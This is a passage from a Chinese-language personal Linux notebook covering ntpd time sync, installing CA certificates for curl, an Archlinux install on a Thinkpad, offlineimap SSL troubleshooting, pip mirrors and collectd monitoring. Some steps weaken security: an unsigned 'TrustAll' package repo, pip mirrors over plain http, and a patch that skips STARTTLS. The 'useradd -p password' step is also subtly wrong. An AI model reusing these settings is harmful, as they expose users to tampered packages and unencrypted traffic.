         echo "."
         ;;
       stop) echo -n "Stopping $DESC: $NAME"
         start-stop-daemon -K -q -n $NAME
         echo "."
         ;;
       reload|force-reload) echo -n "Reloading $DESC configuration..."
         start-stop-daemon -K -q -n $NAME -s 1
         echo "done."
       ;;
       restart) echo "Restarting $DESC: $NAME"
         $0 stop
         sleep 1
         $0 start
         ;;
       ,*) echo "Usage: $SCRIPTNAME {start|stop|restart|reload|force-reload}" >&2
         exit 1
         ;;
     esac

     exit 0
   #+end_src

   其中 $NTPDATE_OPTS 定义在 /etc/default/ntpd 中：

   #+begin_src sh
     NTPDATE_OPTS="-t 5"
   #+end_src

   通过 ntpdate 同步初始时间失败，ntpd 服务可能因为当前系统时间与时间服务器偏差过大而退出。

   同步失败的原因：

   - 开机后网络尚未连通

   - 时间服务器繁忙

   - 网络环境限制使用 NTP 协议

   - 命令执行超时
     
     域名解析、网络请求处理都会占用时间，5 秒钟不一定能完成。

   由于脚本是在系统启动过程中运行，再延长超时时间可能导致开机启动时间变长。

   可以配置 ntpd 在时间偏差过大时仍然同步时间（注意：ntpd 第一次需要 4-5 分钟才能完成同步），有以下几种方法：

   - 添加 -g 命令行选项
     
     =-g= 本地时间与时间服务器偏差达过大（默认为 1000 秒）时，不退出，同步一次时间。

   - 设置 NTPD_PANICGATE 环境变量

     绝大部分命令行选项都可以通过加 NTPD_ 前缀的环境变量进行设置。
     
   - 修改配置文件

     将以下内容添加到 /etc/ntp.conf 最前面
     #+begin_src sh
       tinker panic 0
     #+end_src

*** 手工同步一次

    通过 ntpd 的命令行选项可以更好地完成 ntpdate 的功能。

    =-q= 同步一次后退出。

    #+begin_src sh
      ntpd -g -q
    #+end_src

    上面的命令会确保同步一次时间后结束。

** 参考

   - [[http://blog.csdn.net/suer0101/article/details/7868813][使用ntpdate更新系统时间]]
     
   - [[http://acooly.iteye.com/blog/1993484][NTP服务及时间同步(CentOS6.x)]]

   - [[http://www.psce.com/blog/kb/how-to-periodically-synchronize-time-in-linux/][How to periodically synchronize time in Linux?]]

   - [[http://www.tldp.org/LDP/sag/html/basic-ntp-config.html][Basic NTP configuration]]

   - [[http://linux.die.net/man/8/ntpd][ntpd(8): Network Time Protocol daemon - Linux man page]]

   - [[http://askubuntu.com/a/443077/397632][How to force a clock update using ntp? - Ask Ubuntu]]

* DONE 修复 SSL certificate problem: unable to get local issuer certificate :openssl:security:network:
  CLOSED: [2016-03-14 Mon 20:36]

  在嵌入式 linux 设备上使用 curl 访问 https 站点会报错：
  #+begin_example
    # curl https://www.google.com
    curl: (60) SSL certificate problem: unable to get local issuer certificate
    More details here: http://curl.haxx.se/docs/sslcerts.html

    curl performs SSL certificate verification by default, using a "bundle"
     of Certificate Authority (CA) public keys (CA certs). If the default
     bundle file isn't adequate, you can specify an alternate file
     using the --cacert option.
    If this HTTPS server uses a certificate signed by a CA represented in
     the bundle, the certificate verification probably failed due to a
     problem with the certificate (it might be expired, or the name might
     not match the domain name in the URL).
    If you'd like to turn off curl's verification of the certificate, use
     the -k (or --insecure) option.
  #+end_example

  而 linux 桌面上使用 curl 访问 https 站点则正常：
  #+begin_example
    $ curl https://www.google.com
    <HTML><HEAD><meta http-equiv="content-type" content="text/html;charset=utf-8">
    <TITLE>302 Moved</TITLE></HEAD><BODY>
    <H1>302 Moved</H1>
    The document has moved
    <A HREF="https://www.google.com.hk/?gfe_rd=cr&amp;ei=i2DmVtXLDOzN8geg-afACA">here</A>.
    </BODY></HTML>
  #+end_example

  嵌入式 linux 设备上缺少了 CA 证书。

** 什么是 CA 证书

   #+begin_quote
   Certificate Authority (CA) Certificates
   
   A certificate authority (CA) is a trusted entity that issues electronic documents that verify a digital entity’s identity on the Internet. The electronic documents, which are called digital certificates, are an essential part of secure communication and play an important part in the public key infrastructure (PKI). Certificates typically include the owner's public key, the expiration date of the certificate, the owner's name and other information about the public key owner.
   #+end_quote
   引用自 [[http://searchsecurity.techtarget.com/definition/certificate-authority][What is certificate authority (CA)? - Definition from WhatIs.com]]

** 获取 CA 证书
   
   比较有名的 CA 证书列表由 mozilla 维护，[[https://curl.haxx.se/][curl]] 提供了命令行工具 [[https://github.com/curl/curl/raw/master/lib/mk-ca-bundle.pl][mk-ca-bundle.pl]] ，用于下载 mozilla 维护的 CA 证书列表，转换成 SSL 应用程序可直接使用的格式。
   
   linux 系统的 CA 证书由操作系统发行版负责维护，没有统一的标准规定如何维护和管理 CA 证书。

   Archlinux 的 CA 证书由 [[https://www.archlinux.org/packages/core/any/ca-certificates/][ca-certificates]] 包维护，CA 证书来自依赖的包 [[https://www.archlinux.org/packages/core/i686/ca-certificates-mozilla/][ca-certificates-mozilla]] 及 [[https://www.archlinux.org/packages/core/any/ca-certificates-cacert/][ca-certificates-cacert]] 。
   #+begin_example
     $ pacman -Qi ca-certificates
     Name            : ca-certificates
     Version         : 20150402-1
     Description     : Common CA certificates (default providers)
     Architecture    : any
     URL             : http://pkgs.fedoraproject.org/cgit/ca-certificates.git
     Licenses        : GPL2
     Groups          : None
     Provides        : None
     Depends On      : ca-certificates-mozilla  ca-certificates-cacert
     Optional Deps   : None
     Required By     : curl  glib-networking  mono  neon  perl-lwp-protocol-https  qt4
     Optional For    : lib32-openssl  openssl  wget
     Conflicts With  : None
     Replaces        : None
     Installed Size  : 1024.00 B
     Packager        : Jan Alexander Steffens (heftig) <jan.steffens@gmail.com>
     Build Date      : 2015年04月03日 星期五 04时36分52秒
     Install Date    : 2015年04月13日 星期一 16时04分37秒
     Install Reason  : Installed as a dependency for another package
     Install Script  : No
     Validated By    : Signature
     $ pacman -Ql ca-certificates
     $ pacman -Ql ca-certificates-cacert
     ca-certificates-cacert /usr/
     ca-certificates-cacert /usr/share/
     ca-certificates-cacert /usr/share/ca-certificates/
     ca-certificates-cacert /usr/share/ca-certificates/trust-source/
     ca-certificates-cacert /usr/share/ca-certificates/trust-source/anchors/
     ca-certificates-cacert /usr/share/ca-certificates/trust-source/anchors/CAcert.org_class3.crt
     ca-certificates-cacert /usr/share/ca-certificates/trust-source/anchors/CAcert.org_root.crt
     ca-certificates-cacert /usr/share/licenses/
     ca-certificates-cacert /usr/share/licenses/ca-certificates-cacert/
     ca-certificates-cacert /usr/share/licenses/ca-certificates-cacert/LICENSE
     $ pacman -Ql ca-certificates-mozilla
     ca-certificates-mozilla /usr/
     ca-certificates-mozilla /usr/share/
     ca-certificates-mozilla /usr/share/ca-certificates/
     ca-certificates-mozilla /usr/share/ca-certificates/trust-source/
     ca-certificates-mozilla /usr/share/ca-certificates/trust-source/mozilla.neutral-trust.crt
     ca-certificates-mozilla /usr/share/ca-certificates/trust-source/mozilla.supplement.p11-kit
     ca-certificates-mozilla /usr/share/ca-certificates/trust-source/mozilla.trust.crt
   #+end_example

   拷贝 Archlinux 的 CA 证书文件 /etc/ssl/certs/ca-certificates.crt 到嵌入式 linux 设备，
   curl 编译时需要通过 =--with-ca-bundle= 指定默认的 CA 证书文件，运行时通过 =--cacert= 选项指定
   #+begin_example
     # curl https://www.google.com --cacert /etc/ssl/certs/ca-certificates.crt
     <HTML><HEAD><meta http-equiv="content-type" content="text/html;charset=utf-8">
     <TITLE>302 Moved</TITLE></HEAD><BODY>
     <H1>302 Moved</H1>
     The document has moved
     <A HREF="https://www.google.com.hk/?gfe_rd=cr&amp;ei=LoDmVuXlB9TC8gecrZv4DA">here</A>.
     </BODY></HTML>
   #+end_example

** 更新 CA 证书

*** 使用 openwrt 的嵌入式设备
     
    可以通过 opkg 进行安装和更新 CA 证书文件

    #+begin_src sh
      opkg install ca-certificates
      opkg upgrade ca-certificates
    #+end_src

*** 使用 linux 的嵌入式设备
     
    如果没有软件包管理器，可以从 linux 服务器上定时下载最新的 CA 证书文件。

    linux 服务器上的 CA 证书文件可以通过两种方式更新

    - 更新 ca-certificates 软件包
      
      CentOS 6.4
      #+begin_src sh
        yum update ca-certificates
      #+end_src

      CentOS 6.4 的 CA 证书文件 /etc/pki/tls/certs/ca-bundle.crt

    - [[https://github.com/curl/curl/raw/master/lib/mk-ca-bundle.pl][mk-ca-bundle.pl]] 脚本生成最新的 CA 证书文件

      该脚本生成的 CA 证书文件包含 mozilla 维护的证书

      #+begin_src sh
        mk-ca-bundle.pl -q ca-bundle.crt
      #+end_src

** 参考

   - [[https://en.wikipedia.org/wiki/Root_certificate][Root certificate - Wikipedia, the free encyclopedia]]

   - [[https://curl.haxx.se/docs/sslcerts.html][cURL - SSL CA Certificates]]

   - [[https://gist.github.com/jjb/996292][How to securely acquire the Mozilla root certificate bundle for use with curl, Net::HTTP, etc.]]

   - [[https://curl.haxx.se/docs/mk-ca-bundle.html][mk-ca-bundle]]

   - [[https://wiki.openwrt.org/doc/howto/wget-ssl-certs][SSL and Certificates in wget - OpenWrt Wiki]]

   - [[https://www.happyassassin.net/2015/01/12/a-note-about-ssltls-trusted-certificate-stores-and-platforms/][A note about SSL/TLS trusted certificate stores, and platforms (OpenSSL and GnuTLS)]]

   - [[http://searchsecurity.techtarget.com/definition/certificate-authority][What is certificate authority (CA)? - Definition from WhatIs.com]]

   - [[https://projects.archlinux.org/svntogit/packages.git/tree/trunk/PKGBUILD?h=packages/curl][PKGBUILD of curl on Archlinux]]

* DONE Thinkpad T540p 安装 Archlinux                     :thinkpad:archlinux:
  CLOSED: [2016-03-17 Thu 18:09]

  如果你是重新安装 Archlinux 则建议在安装前记录一下现有系统的软件列表，方便装完新系统后继续安装需要的软件

  #+begin_src sh
    pacman -Qqe | grep -vx "$(pacman -Qqm)" > Packages
    pacman -Qqm > Packages.aur
  #+end_src

  参考
  
  - [[https://wiki.archlinux.org/index.php/migrate_installation_to_new_hardware][Migrate installation to new hardware - ArchWiki]]

** 下载 ISO

   从 [[https://www.archlinux.org][Archlinux 官网]] 下载最新的安装包 [[https://www.archlinux.org/download/][archlinux-2016.03.01-dual.iso]]

** 创建安装盘

   通过 dd 将 ISO 写入 U 盘创建安装盘。

   参考
   
   - [[https://wiki.archlinux.org/index.php/USB_flash_installation_media_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29#GNU.2FLinux][USB flash installation media (简体中文) - ArchWiki]]

** BIOS 启用 UEFI

** 开始安装

   按照 [[https://wiki.archlinux.org/index.php/Beginners'_guide][Beginners' guide - ArchWiki]] 一步步安装到 [[https://wiki.archlinux.org/index.php/Beginners'_guide#Initramfs][Initramfs]] ，分区分案选 [[https://wiki.archlinux.org/index.php/Beginners'_guide#UEFI.2FGPT_examples][UEFI/GPT]]。

   [[https://wiki.archlinux.org/index.php/Beginners'_guide#Install_a_boot_loader][Install a boot loader]] 这一步改成 [[使用 UEFI 做为启动管理器]] 。


   针对固态硬盘的优化建议

   - 格式化 ext4 分区时添加选项 4K 对齐

     #+begin_src sh
       mkfs.ext4 -b 4096 /dev/sdXX
     #+end_src
   
   - 挂载 ext4 分区时添加选项 discard,noatime

     #+begin_src sh
       mount -t ext4 /dev/sdXX /mnt -o discard,noatime
     #+end_src

     noatime 读取文件的时候不修改读取的时间，减少对 ssd 的写入次数
     discard 启动 trim

** 使用 UEFI 做为启动管理器

   由于主板直接支持 UEFI 启动，使用 efibootmgr 来创建 Boot Loader 不但更简单，而且系统启动更快。

   参考
   
   - [[https://wiki.archlinux.org/index.php/EFISTUB#Using_UEFI_directly_.28efibootmgr.29][EFISTUB - Using UEFI directly (efibootmgr) - ArchWiki]]

   - [[http://superuser.com/questions/912417/i-wanted-to-install-arch-linux-on-a-uefi-gpt-system-and-had-questions-about-the/912435#912435][I wanted to install arch linux on a UEFI/GPT system and had questions about the process - Super User]]

** 开通 sudo 权限组

   运行 visudo，修改如下

   #+begin_example
     ## Uncomment to allow members of group wheel to execute any command
     %wheel ALL=(ALL) ALL
   #+end_example

   - wheel :: 为 sudo 权限组   

** 创建个人帐号

   加入 sudo 权限组

   #+begin_src sh
     useradd tangxinfa -m -G wheel -p password
   #+end_src

   - tangxinfa :: 为个人帐号名称，请自行修改

   - password :: 为个人帐号密码，请自行修改

   - wheel :: 为 sudo 权限组

              
   接下来的操作可以切到个人帐号了。
   
   #+begin_src sh
     su - tangxinfa
   #+end_src

** 安装 gnome 桌面

   #+begin_src sh
     sudo pacman -S gnome gnome-extra gdm
     sudo systemctl enable gdm
     sudo systemctl -f enable graphical.target
     sudo systemctl enable NetworkManager
   #+end_src

   参考
   
   - [[https://wiki.archlinux.org/index.php/GNOME_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29][GNOME (简体中文) - ArchWiki]]

   - [[https://wiki.archlinux.org/index.php/GDM_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29][GDM (简体中文) - ArchWiki]]

** 安装 fcitx 输入法

   参考

   - [[http://blog.kankanan.com/article/archlinux-4e0b5b8988c5-fcitx-8f9351656cd5.html][Archlinux下安装fcitx输入法 | 看看俺 – KanKanAn.com]]

   - [[https://wiki.archlinux.org/index.php/Fcitx][Fcitx - ArchWiki]]

** 安装 yaourt

   - yaourt :: Yet AnOther User Repository Tool

   
   封装了 pacman，支持安装用户软件仓库里的软件包。

   =/etc/pacman.conf= 添加配置
   #+begin_example
     [archlinuxfr]
     SigLevel = Optional TrustAll
     Server = http://repo.archlinux.fr/$arch
   #+end_example

   安装 yaourt
   #+begin_src sh
     pacman -S yaourt
   #+end_src

   参考

   - [[http://bashell.nodemedia.cn/archives/install-yaourt.html][Yaourt的安装及使用 | 贝壳博客]]

** 触摸板

   #+begin_src sh
     yaourt -S xf86-input-synaptics
   #+end_src

   - 触摸板调优
   
     [[http://blog.kankanan.com/article/thinkpad-t540p-4fee590d-linux-4e0b89e66478677f63094e0b65f6514968074f4d7f6e79fb52a895ee9898.html][Thinkpad T540p修复linux下触摸板按下时光标位置移动问题 | 看看俺 – KanKanAn.com]]

     为避免打字时误触，在 ~/.xprofile 中添加以下内容：
     #+begin_example
       syndaemon -d -i 2 -t
     #+end_example

   - 触摸板失灵
     
     移动光标位置却是滚动效果（就像是单指操作变成双指操作了），移动光标时位置卡顿。
     
     安装 evtest
     #+begin_src sh
       yaourt -S evtest
     #+end_src
     
     获取触摸板事件号
     #+begin_example
       $ cat /proc/bus/input/devices | grep Synaptics -A 10 | grep event
       H: Handlers=event15 mouse1 
     #+end_example

     检测触摸板事件
     #+begin_example
     $ sudo evtest /dev/input/event15
     #+end_example

     发现触摸板失灵时，也有触模板压下事件产生，估计是硬件不灵敏了，应该可以通过调整相关参数忽略掉 =man= =synaptics= 。
     
     使用蓝牙音箱时，触模板必失灵，需要重启系统触模板才能恢复，暂未找到解决方案。

   参考
   
   - [[https://wiki.archlinux.org/index.php/Touchpad_Synaptics][Touchpad Synaptics - ArchWiki]]

** 指纹识别

   安装指纹识别模块

   #+begin_src sh
     yaourt -S fprintd libfprint-git
   #+end_src

   录入指纹

   #+begin_src sh
     fprintd-enroll
   #+end_src

   测试指纹
   
   #+begin_src sh
     fprintd-verify
   #+end_src

   多测试几次，如果效果不好则重新录入。

   锁定桌面，试试使用指纹解锁。

   
   参考

   - [[https://github.com/ars3niy/fprint_vfs5011/issues/9][Verify result always returning "verify-no-match" · Issue #9 · ars3niy/fprint_vfs5011]]

** 定制 gnome3

   安装扩展

   - 程序托盘图标回到屏幕右上角

     [[https://extensions.gnome.org/extension/495/topicons/][TopIcons]]

   - 窗口标题栏融入活动栏

     [[https://extensions.gnome.org/extension/723/pixel-saver/][Pixel Saver]]

   调试扩展
   
   - 启动 Looking Glass

     按快捷键 =Alt= + =F2= 输入 =lg=

   - 切到 Extensions 页

     找到出问题的插件，点击 Show Errors，一般是系统少安装了某些包，使用 pacman 安装即可

   - 重新载入桌面

     按快捷键 =Alt= + =F2= 输入 =r=

** 避免启动后总是静音

   安装 alsa-utils，保存音量设置。

** 显卡驱动
   
   机器是双显卡，一块 Intel 的集显加上 Nvida 的独显。
   默认的开源显卡驱动也够用，使用 Nvida 的独显效果更好。

   #+begin_src sh
     pacman -S nvidia
   #+end_src
   参考 [[http://blog.csdn.net/zhyh1986/article/details/39892611][ArchLinux边用边记 - 竹叶青的专栏 - 博客频道 - CSDN.NET]]

** 蓝牙耳机

   安装相关软件包
   #+begin_src sh
     yaourt -S pulseaudio-bluetooth bluez-firmware bluez-utils
   #+end_src

   启动蓝牙服务
   #+begin_src sh
     sudo systemctl enable bluetooth
     sudo systemctl start bluetooth
   #+end_src
   
   参考
   - [[https://wiki.archlinux.org/index.php/Bluetooth_headset_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29][Bluetooth headset (简体中文) - ArchWiki]]

* DONE 修复 offlineimap 无法收邮件的问题               :linux:network:python:
  CLOSED: [2016-03-18 Fri 10:44]

** 不使用 ssl

   .offlineimaprc 配置
   #+begin_example
     ssl = no
   #+end_example


   offlineimap 收邮件出错
   #+begin_example
     $ offlineimap
     ...
      Establishing connection to imap.xxxxxx.com:143
      ERROR: Could not connect via SSL to host 'imap.xxxxxx.com' and non-standard ssl port 143 configured. Make sure you connect to the correct port.
     ... 
   #+end_example
   意外地使用了 ssl 进行连接。

   
   telnet 邮件服务器进行诊断
   #+begin_example
     $ telnet imap.xxxxxx.com 143
     Connected to imap.xxxxxx.com.
     Escape character is '^]'.
     ,* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS] Courier-IMAP ready. Copyright 1998-2011 Double Precision, Inc.  See COPYING for distribution information.
   #+end_example
   输出的 CAPABILITY 包含 STARTTLS，应该是邮件服务器配置有误
  
  
   修改 offlineimap 的源代码文件 [[file:///usr/lib/python2.7/site-packages/offlineimap/imapserver.py][imapserver.py]] ，我们的邮箱不使用 tls
   #+begin_src python
     269  def __start_tls(self, imapobj):
     270          if 'STARTTLS' in imapobj.capabilities and not self.usessl:
   #+end_src

   改成
   #+begin_src python
     269  def __start_tls(self, imapobj):
     270          if 'STARTTLS' in imapobj.capabilities and not self.usessl and self.repos.account.name != 'xxxxxx':
   #+end_src

  
   - 更好的做法

     在 imap 协议许可的情况下，加强容错性，tls 连接失败后，使用普通连接重连。
     .offlineimaprc 新加禁用 tls 的配置项，警告用户服务器可能配置有误，提示用户禁用 tls。

   - 相关的问题

     [[https://github.com/OfflineIMAP/offlineimap/pull/54][Optional TLS by mativs · Pull Request #54 · OfflineIMAP/offlineimap]]

     有这个问题的 patch，但是没有下文。

   - [[https://github.com/OfflineIMAP/offlineimap][offlineimap]] 新加的 starttls 选项解决了这个问题
     
     #+begin_example
       commit ac2a547ec46d590d041d410723f90f45fcb802fe
       Author: Nicolas Sebrecht <nicolas.s-dev@laposte.net>
       Date:   Thu Jun 23 03:55:00 2016 +0200

       learn to disable STARTTLS

       Some servers might have this feature broken.

       Github-ref: https://github.com/OfflineIMAP/offlineimap/issues/207
       Signed-off-by: Nicolas Sebrecht <nicolas.s-dev@laposte.net>
     #+end_example

     在 .offlineimaprc 中添加禁用 starttls 配置项
     #+begin_example
     starttls = no
     #+end_example

** 使用 ssl

   .offlineimaprc 配置
   #+begin_example
     ssl = yes
   #+end_example


   offlineimap 收邮件出错
   #+begin_example
     $ offlineimap
     ...
      Establishing connection to imap.xxxxxx.com:993
      ERROR: Unknown SSL protocol connecting to host 'imap.xxxxxx.com' for repository 'XxxxxxRemote'. OpenSSL responded:
     [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:590)
     ... 
   #+end_example
   ssl 证书验证失败。

   curl 邮件服务器进行诊断
   #+begin_example
     $ curl https://imap.xxxxxx.com:993/
     curl: (60) SSL certificate problem: self signed certificate
   #+end_example
   邮件服务器的 ssl 证书是自签名的

   从服务器提取证书
   #+begin_src sh
     echo | openssl s_client -connect imap.xxxxxx.com:993 2>&1 | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' > ~/imap.xxxxxx.com.pem
   #+end_src

   .offlineimaprc 指定证书
   #+begin_example
     ssl = yes
     sslcacertfile = /home/xxxxxxxx/imap.xxxxxx.com.pem
   #+end_example
   

   offlineimap 收邮件出错
   #+begin_example
     $ offlineimap
     ...
      Establishing connection to imap.xxxxxx.com:993
      ERROR: Unknown SSL protocol connecting to host 'imap.xxxxxx.com' for repository 'XxxxxxRemote'. OpenSSL responded:
     [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:590)
     ...
   #+end_example
   ssl 证书验证失败。

   curl 邮件服务器进行诊断
   #+begin_example
     $ curl https://imap.xxxxxx.com:993/ --cacert /home/xxxxxxxx/imap.xxxxxx.com.pem
     curl: (60) SSL certificate problem: certificate has expired
   #+end_example
   邮件服务器的 ssl 证书已过期。

   
   提取 ssl 证书指纹
   #+begin_example
     $ openssl x509 -noout -in ~/imap.xxxxxx.com.pem -fingerprint -sha1
     SHA1 Fingerprint=XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX
   #+end_example

   .offlineimaprc 使用证书指纹
   #+begin_example
     ssl = yes
     #sslcacertfile = /home/xxxxxxxx/imap.xxxxxx.com.pem
     cert_fingerprint = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
   #+end_example
   参考 [[https://github.com/OfflineIMAP/offlineimap/pull/8][Adding support for multi-fingerprint IMAP servers by Kdecherf · Pull Request #8 · OfflineIMAP/offlineimap]]

   offlineimap 收邮件出错
   #+begin_example
     $ offlineimap
      Establishing connection to imap.xxxxxx.com:993
      ERROR: Unknown SSL protocol connecting to host 'imap.xxxxxx.com' for repository 'XxxxxxRemote'. OpenSSL responded:
     [SSL: SSL_NEGATIVE_LENGTH] dh key too small (_ssl.c:590)
   #+end_example
   邮件服务器的 openssl 可能太老了，生成的 DH KEY 文件只有 768 位不安全，需要重新生成更安全的 KEY 文件。
   参考 [[http://offlineimap-project.alioth.debian.narkive.com/dVTlxZyP/ssl-error-with-offlineimap-version-6-6-1-debian-package][Ssl error with offlineimap version 6.6.1 (debian package)]]

   使用 ssl 折腾失败，还是邮件服务器配置问题，除非 offlineimap 支持对服务器不进行安全验证，否则服务器端才能解决。

* DONE 使用国内镜像加速 pip                                          :python:
  CLOSED: [2016-03-21 Mon 18:27]

  pip 官方镜像被墙，可以使用用国内镜像进行访问

  - http://pypi.douban.com/simple/

  - http://mirrors.aliyun.com/pypi/simple/


** 命令行指定镜像
  
   #+begin_src sh
     pip install -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com <package>
   #+end_src

** 配置文件指定镜像

   pip 的配置文件为 =~/.pip/pip.conf=

   #+begin_example
     [global]
     index-url = http://mirrors.aliyun.com/pypi/simple/

     [install]
     trusted-host = mirrors.aliyun.com
   #+end_example

   使用 pip 安装包时要使用 root 帐号，配置文件实际位置为 =/root/.pip/pip.conf= 。

   使用 =pip= =install= 命令安装包时，默认会使用配置文件中指定的镜像。

** 参考

   - [[http://www.isaced.com/post-228.html][Pythoner的福利，豆瓣的PyPI源 - isaced]]

   - [[http://www.cnblogs.com/yudar/p/4657511.html][linux 设置pip 镜像 Pip Warning：–trusted-host 问题解决方案 - Yudar - 博客园]]

* DONE Archlinux 下编译 MaidSafe                      :p2p:bitcion:archlinux:
  CLOSED: [2016-03-30 Wed 16:26]

  按照文档 [[https://github.com/maidsafe-archive/MaidSafe/wiki/Build-Instructions-for-Linux][Build Instructions for Linux · maidsafe-archive/MaidSafe Wiki]] 的指示进行。

  安装 icu-staticlibs 时，由于与已安装的 icu 软件包存在文件冲突，正常安装是装不了的，加上 =--force= 选项即可
  #+begin_src sh
    yaourt --force -S icu-staticlibs
  #+end_src

  编译 master 分枝会出错，切到 next 分枝再编译即可
  #+begin_src sh
    git submodule foreach "git checkout next; git pull"
    git checkout next; git pull
  #+end_src

  参考

  - [[https://github.com/maidsafe-archive/MaidSafe/issues/234][make: *** {ExperCommon} Error 2 · Issue #234 · maidsafe-archive/MaidSafe]]

* DONE 使用 collectd 进行服务监控                                     :linux:collectd:
  CLOSED: [2016-03-31 Thu 12:39]

  collectd 的官网 [[https://collectd.org/][collectd.org]] 。

** collectd 服务

   - 安装

     #+begin_src sh
       yaourt -S collectd
     #+end_src

   - 启动

     #+begin_src sh
       sudo systemctl enable collectd
       sudo systemctl start collectd
     #+end_src

** collectd 界面

*** [[http://blog.kankanan.com/article/nginx-4e0b5feb901f642d5efa-php-8fd0884c73af5883.html][nginx下快速搭建php运行环境]]

*** 安装 rrdtool

    #+begin_src sh
      yaourt -S rrdtool
    #+end_src

*** 下载 GCP
    
    #+begin_src sh
      cd /usr/share/nginx/html/
      sudo git clone https://github.com/pommi/CGP.git
    #+end_src

*** 配置 GCP

    修改配置文件 /usr/share/nginx/html/CGP/conf/config.php
    #+begin_example
      # collectd's datadir
      $CONFIG['datadir'] = '/var/lib/collectd/rrd';
    #+end_example
    改为
    #+begin_example
      # collectd's datadir
      $CONFIG['datadir'] = '/var/lib/collectd';
    #+end_example

*** 打开界面

    浏览器打开页面 [[http://localhost/CGP/index.php][http://localhost/CGP/index.php]] ，可以看到服务器自身的监控信息。

** collectd 插件

   collectd 支持很多 [[https://collectd.org/wiki/index.php/Table_of_Plugins][插件]] ，使用 c 语言开发插件请参考 [[https://collectd.org/wiki/index.php/Plugin_architecture][Plugin architecture - collectd Wiki]]。

   [[https://collectd.org/wiki/index.php/Plugin:Exec][Exec]] 插件使用 shell 脚本来收集系统监控数据。

   以监控电池电量为例。

*** 启用 Exec 插件

    修改 collectd 配置文件 /etc/collectd.conf
    #+begin_example
      LoadPlugin exec
      <Plugin exec>
         Exec "nobody:nobody" "/usr/bin/power-capacity"
      </Plugin>
    #+end_example

*** 监控笔记本电量脚本

    =/usr/bin/power-capacity=
    #+begin_src sh
      #!/bin/bash

      HOSTNAME="${COLLECTD_HOSTNAME:-localhost}"
      INTERVAL="${COLLECTD_INTERVAL:-60}"

      while sleep "$INTERVAL"; do
        VALUE=$(echo -n `cat /sys/class/power_supply/BAT0/capacity`)
        echo "PUTVAL \"$HOSTNAME/power/capacity\" interval=$INTERVAL N:$VALUE"
      done
    #+end_src
    
    为脚本添加可执行权限
    #+begin_src sh
      sudo chmod a+x /usr/bin/power-capacity
    #+end_src

*** 重启 collectd 生效插件

    #+begin_src sh
      sudo systemctl restart collectd
    #+end_src

    过一会儿就可以在界面上看到电量监控项。

** collectd 多机器监控

   监控本机没有什么用处，通过 network 插件，可以将 collectd 配置为服务器或客户端。

   - collectd 服务器

     接受 collectd 客户端的上报的数据。

   - collectd 客户端

     上报数据到 collectd 服务器。

*** 本机配置为 collectd 服务器

    通过 [[https://collectd.org/documentation/manpages/collectd.conf.5.shtml#plugin_network][network]] 插件配置为 server 端。

    修改 collectd 配置文件 /etc/collectd.conf 
    #+begin_example
      LoadPlugin network
          
      <Plugin network>
          <Listen "0.0.0.0" "25826">
              SecurityLevel Sign
              AuthFile "/etc/collectd/passwd"
          </Listen>
      </Plugin>
    #+end_example

    创建密码文件
    =/etc/collectd/passwd=
    #+begin_example
      user0: foo
      user1: bar
    #+end_example

    重启 collectd 服务，生效配置。

*** 其它机器配置为 collectd 客户端

    参考前面的 [[collectd 服务]] 一节安装 collectd。

    通过 [[https://collectd.org/documentation/manpages/collectd.conf.5.shtml#plugin_network][network]] 插件配置为 client 端。

    修改 collectd 配置文件 /etc/collectd.conf 
    #+begin_example
      LoadPlugin network
          
      <Plugin network>
          <Server "172.17.0.1" "25826">
              SecurityLevel Encrypt
              Username "user0"
              Password "foo"
          </Server>
      </Plugin>
    #+end_example
    服务器的 IP 为 172.17.0.1。

    重启 collectd 服务，生效配置，等一会儿就可以在界面上看到客户端机器的监控信息。

** 参考

   - [[https://github.com/pommi/CGP/blob/master/README.md][CGP/README.md at master · pommi/CGP]]

   - [[https://collectd.org/wiki/index.php/First_steps][First steps - collectd Wiki]]

   - [[http://www.drupal001.com/2012/07/system-monitor-collectd/][Collectd详解、Collectd使用说明、Collectd中文说明 - 系统性能监控利器]]

   - [[https://collectd.org/wiki/index.php/Plugin:Exec][Plugin:Exec - collectd Wiki]]

   - [[http://blog.sina.com.cn/s/blog_502c8cc40100pbgu.html][collectd使用_新浪研发中心_新浪博客]]

   - [[https://collectd.org/documentation/manpages/collectd.conf.5.shtml#global_options][collectd.conf(5) – collectd – The system statistics collection daemon]]

* DONE Archlinux 的 collectd 支持监控 redis                 :redis:archlinux:collectd:
  CLOSED: [2016-03-31 Thu 17:44]

  Archlinux 下使用 =pacman= 安装的 =collectd= 没有 redis 插件。
  
  查看 collectd 的 [[https://projects.archlinux.org/svntogit/community.git/tree/trunk/PKGBUILD?h=packages/collectd][PKGBUILD]] 文件，并未明令禁止 redis 插件，从源代码编译安装的话，只要系统装了 =hiredis= ，redis 插件应该就会自动启用。

  所以我们需要从源代码编译安装 =collectd= 软件包。

** 安装 ABS

   #+begin_quote
   What is the Arch Build System?

   The Arch Build System is a ports-like system for building and packaging software from source code. While pacman is the specialized Arch tool for binary package management (including packages built with the ABS), ABS is a collection of tools for compiling source into installable .pkg.tar.xz packages.    
   #+end_quote
   引用自 [[https://wiki.archlinux.org/index.php/Arch_Build_System][Arch Build System - ArchWiki]]

   #+begin_src sh
     yaourt -S abs
     sudo abs
   #+end_src

** 编译安装 collectd

   #+begin_src sh +n -r
     yaourt -S hiredis
     cp -R /var/abs/community/collectd ~/
     cd ~/collectd
     makepkg               (ref:archlinux_makepkg)
     yaourt -U ./collectd-5.5.1-2-x86_64.pkg.tar.xz
   #+end_src

   - 行 [[(archlinux_makepkg)]]  :: 如果报 =Missing dependencies= 错误则按提示使用 pacman 装上缺失的依赖项

** 使用以前的 collectd 配置

   重新安装 collectd 后，以前的配置保存在 =/etc/collectd.conf.pacsave= ，恢复一下
